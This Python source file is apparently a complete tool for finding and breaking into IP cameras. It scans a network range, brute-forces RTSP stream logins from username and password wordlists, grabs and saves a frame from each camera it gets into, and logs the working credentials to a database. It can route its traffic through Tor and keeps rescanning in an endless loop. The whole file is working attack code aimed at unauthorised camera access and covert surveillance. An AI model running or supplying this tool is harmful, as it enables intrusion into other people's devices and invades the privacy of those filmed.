import asyncio
import aiohttp
import aiosqlite
import cv2
import socket
import ipaddress
import logging
import yaml
import time
import aiofiles
import sys
try:
    import aiohttp_socks
    HAVE_SOCKS = True
except ImportError:
    HAVE_SOCKS = False
from dataclasses import dataclass
from logging.handlers import RotatingFileHandler
from typing import List, Tuple, Optional, Dict, Any
from functools import partial

@dataclass
class PerformanceConfig:
    concurrency: int
    timeout: int

@dataclass
class RTSPUrl:
    model: str
    pattern: str

@dataclass
class TorProxyConfig:
    enabled: bool
    host: str
    port: int

@dataclass
class Config:
    network_range: str
    ports: List[int]
    usernames: str
    passwords: str
    rtsp_urls: List[RTSPUrl]
    performance: PerformanceConfig
    scanning_interval: int
    log_level: str = "INFO"
    tor_proxy: Optional[TorProxyConfig] = None

class ConfigLoader:
    @staticmethod
    def load(path: str) -> Config:
        with open(path, 'r') as f:
            data = yaml.safe_load(f)
            
            # Handle optional tor_proxy config
            tor_proxy = None
            if 'tor_proxy' in data:
                tor_proxy = TorProxyConfig(**data['tor_proxy'])
                
            return Config(
                network_range=data['network_range'],
                ports=data['ports'],
                usernames=data['usernames'],
                passwords=data['passwords'],
                rtsp_urls=[RTSPUrl(**url) for url in data['rtsp_urls']],
                performance=PerformanceConfig(**data['performance']),
                scanning_interval=data['scanning_interval'],
                log_level=data.get('log_level', 'INFO'),
                tor_proxy=tor_proxy
            )

@dataclass
class DatabaseManager:
    db_path: str = 'cameras.db'
    
    async def initialize(self):
        async with aiosqlite.connect(self.db_path) as db:
            await db.execute('''
                CREATE TABLE IF NOT EXISTS cameras (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ip TEXT NOT NULL,
                    username TEXT NOT NULL,
                    password TEXT NOT NULL,
                    model TEXT NOT NULL,
                    discovered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            await db.commit()

    async def insert(self, ip: str, username: str, password: str, model: str):
        async with aiosqlite.connect(self.db_path) as db:
            await db.execute('''
                INSERT INTO cameras (ip, username, password, model)
                VALUES (?, ?, ?, ?)
            ''', (ip, username, password, model))
            await db.commit()

class AsyncScanner:
    def __init__(self, config: Config):
        self.config = config
        self.semaphore = asyncio.Semaphore(config.performance.concurrency)
        self.timeout = config.performance.timeout
        self.ports = config.ports
        self.use_tor = config.tor_proxy and config.tor_proxy.enabled
        
        if self.use_tor:
            if not HAVE_SOCKS:
                logger.error("aiohttp_socks is required for Tor support. Install with 'uv pip install aiohttp_socks'")
                logger.warning("Falling back to direct connections")
                self.use_tor = False
            else:
                self.tor_host = config.tor_proxy.host
                self.tor_port = config.tor_proxy.port
                logger.info(f"Scanner using Tor proxy: {self.tor_host}:{self.tor_port}")

    async def scan_network(self):
        tasks = []
        ips = ipaddress.IPv4Network(self.config.network_range)
        for ip in ips:
            tasks.append(self._check_ip(str(ip)))
        return await asyncio.gather(*tasks)

    async def _check_ip(self, ip: str):
        for port in self.ports:
            connection_url = f"http://{ip}:{port}"
            logger.info(f"Scanning: {connection_url}")
            try:
                async with self.semaphore:
                    if self.use_tor:
                        # Using tor proxy for connection
                        logger.info(f"Using Tor to connect to {connection_url}")
                        try:
                            connector = aiohttp_socks.ProxyConnector.from_url(
                                f'socks5://{self.tor_host}:{self.tor_port}'
                            )
                            async with aiohttp.ClientSession(connector=connector) as session:
                                try:
                                    async with session.get(
                                        connection_url, 
                                        timeout=self.timeout
                                    ) as response:
                                        logger.info(f"Successfully connected to: {connection_url}")
                                        return ip
                                except Exception as e:
                                    logger.info(f"Failed to connect to {connection_url}: {str(e)}")
                        except Exception as e:
                            logger.error(f"Error using Tor proxy for {connection_url}: {str(e)}")
                            continue
                    else:
                        # Direct connection
                        logger.info(f"Direct connection to {connection_url}")
                        reader, writer = await asyncio.wait_for(
                            asyncio.open_connection(ip, port),
                            timeout=self.timeout
                        )
                        writer.close()
                        await writer.wait_closed()
                        logger.info(f"Successfully connected to: {connection_url}")
                        return ip
            except Exception as e:
                logger.info(f"Failed to connect to {connection_url}: {str(e)}")
                continue
        return None

class CredentialTester:
    def __init__(self, config: Config):
        self.rtsp_urls = config.rtsp_urls
        self.usernames = self._load_list(config.usernames)
        self.passwords = self._load_list(config.passwords)
        self.semaphore = asyncio.Semaphore(config.performance.concurrency)
        self.timeout = config.performance.timeout
        
        # Configure tor proxy if enabled
        self.use_tor = config.tor_proxy and config.tor_proxy.enabled
        self.proxy = None
        
        if self.use_tor:
            if not HAVE_SOCKS:
                logger.error("aiohttp_socks is required for Tor support. Install with 'uv pip install aiohttp_socks'")
                logger.warning("Falling back to direct connections for credential testing")
                self.use_tor = False
            else:
                self.tor_host = config.tor_proxy.host
                self.tor_port = config.tor_proxy.port
                proxy_url = f"socks5://{self.tor_host}:{self.tor_port}"
                self.proxy = proxy_url
                logger.info(f"Credential tester using Tor proxy: {proxy_url}")
        
        # Create ClientSession with proxy if configured
        if self.use_tor:
            connector = aiohttp_socks.ProxyConnector.from_url(self.proxy)
            self.session = aiohttp.ClientSession(connector=connector)
        else:
            self.session = aiohttp.ClientSession()

    def _load_list(self, path: str) -> List[str]:
        with open(path, 'r') as f:
            return [line.strip() for line in f if line.strip()]

    async def test_ip(self, ip: str):
        tasks = []
        for username in self.usernames:
            for password in self.passwords:
                for url in self.rtsp_urls:
                    task = self._test_combination(
                        ip, username, password, url
                    )
                    tasks.append(task)
        results = await asyncio.gather(*tasks)
        return [r for r in results if r[0]]

    async def _test_combination(self, ip: str, username: str, password: str, url: RTSPUrl):
        rtsp_url = url.pattern.format(ip=ip, username=username, password=password)
        logger.info(f"Testing RTSP URL: {rtsp_url}")
        try:
            async with self.semaphore:
                async with self.session.get(rtsp_url, timeout=self.timeout) as response:
                    if response.status == 200:
                        frame = await self._capture_frame(rtsp_url)
                        if frame:
                            await self._save_frame(ip, frame)
                            logger.info(f"Successfully connected to: {rtsp_url}")
                            return (True, username, password, url.model)
        except Exception as e:
            logger.info(f"Failed to connect to {rtsp_url}: {str(e)}")
        return (False, None, None, None)

    async def _capture_frame(self, url: str):
        loop = asyncio.get_event_loop()
        try:
            cap = cv2.VideoCapture(url)
            ret, frame = await loop.run_in_executor(None, cap.read)
            cap.release()
            return frame if ret else None
        except:
            return None

    async def _save_frame(self, ip: str, frame):
        filename = f"frames/{ip}_{int(time.time())}.jpg"
        await asyncio.get_event_loop().run_in_executor(
            None, partial(cv2.imwrite, filename, frame)
        )

    async def close(self):
        await self.session.close()

async def main_loop(config: Config):
    # Check if Tor is required and running
    if config.tor_proxy and config.tor_proxy.enabled:
        if not HAVE_SOCKS:
            logger.error("aiohttp_socks is required for Tor support. Install with 'uv pip install aiohttp_socks'")
            logger.error("Cannot continue with Tor support. Exiting.")
            return
        
        # Test Tor connection with retries
        max_retries = 5
        retry_delay = 3
        connected = False
        
        for attempt in range(1, max_retries + 1):
            try:
                logger.info(f"Testing connection to Tor at {config.tor_proxy.host}:{config.tor_proxy.port} (attempt {attempt}/{max_retries})")
                connector = aiohttp_socks.ProxyConnector.from_url(
                    f'socks5://{config.tor_proxy.host}:{config.tor_proxy.port}'
                )
                async with aiohttp.ClientSession(connector=connector) as session:
                    async with session.get('https://check.torproject.org/', timeout=10) as response:
                        text = await response.text()
                        if 'Congratulations' in text:
                            logger.info("Successfully connected through Tor network!")
                            connected = True
                            break
                        else:
                            logger.warning("Connected to proxy, but not using Tor network. Check your Tor configuration.")
                            # Still consider it a success if we can connect to the proxy
                            connected = True
                            break
            except Exception as e:
                logger.warning(f"Failed to connect to Tor (attempt {attempt}/{max_retries}): {str(e)}")
                if attempt < max_retries:
                    logger.info(f"Waiting {retry_delay} seconds before retrying...")
                    await asyncio.sleep(retry_delay)
                else:
                    logger.error("Max retries reached. Failed to connect to Tor proxy.")
        
        if not connected:
            logger.error("Could not establish connection to Tor. Make sure the Tor service is running.")
            # Continue without Tor rather than exiting
            config.tor_proxy.enabled = False
            logger.warning("Continuing without Tor proxy (connecting directly)")
    
    db = DatabaseManager()
    await db.initialize()
    scanner = AsyncScanner(config)
    tester = CredentialTester(config)

    try:
        while True:
            try:
                start = time.monotonic()
                logger.info("Starting network scan...")
                results = await scanner.scan_network()
                valid_ips = [ip for ip in results if ip]
                logger.info(f"Found {len(valid_ips)} active IPs")

                for ip in valid_ips:
                    successes = await tester.test_ip(ip)
                    for success in successes:
                        username, password, model = success[1:]
                        rtsp_url_pattern = next((url.pattern for url in config.rtsp_urls if url.model == model), "")
                        rtsp_url = rtsp_url_pattern.format(ip=ip, username=username, password=password)
                        
                        await db.insert(ip, username, password, model)
                        logger.info(f"Valid credentials found for {model} camera at {ip}")
                        logger.info(f"  - Username: {username}")
                        logger.info(f"  - Password: {password}")
                        logger.info(f"  - RTSP URL: {rtsp_url}")
                        logger.info(f"  - Saved to database and captured frame")

                elapsed = time.monotonic() - start
                sleep_time = max(0, config.scanning_interval - elapsed)
                await asyncio.sleep(sleep_time)
            except Exception as e:
                logger.error(f"Main loop error: {e}")
                await asyncio.sleep(60)
    finally:
        await tester.close()

def setup_logging(log_level):
    logger = logging.getLogger()
    log_level_value = getattr(logging, log_level.upper(), logging.INFO)
    logger.setLevel(log_level_value)
    
    # Create formatter with more detailed output
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    
    # File handler
    file_handler = RotatingFileHandler(
        'scanner.log',
        maxBytes=10*1024*1024,
        backupCount=3
    )
    file_handler.setFormatter(formatter)
    logger.addHandler(file_handler)
    
    # Console handler
    console_handler = logging.StreamHandler()
    console_handler.setFormatter(formatter)
    logger.addHandler(console_handler)
    
    # Log separator for new session
    logger.info("-" * 80)
    logger.info("Starting new scanning session")
    logger.info("-" * 80)

if __name__ == "__main__":
    config = ConfigLoader.load("config.yaml")
    setup_logging(config.log_level)
    logger = logging.getLogger()
    
    try:
        asyncio.run(main_loop(config))
    except KeyboardInterrupt:
        logger.info("Shutting down...")

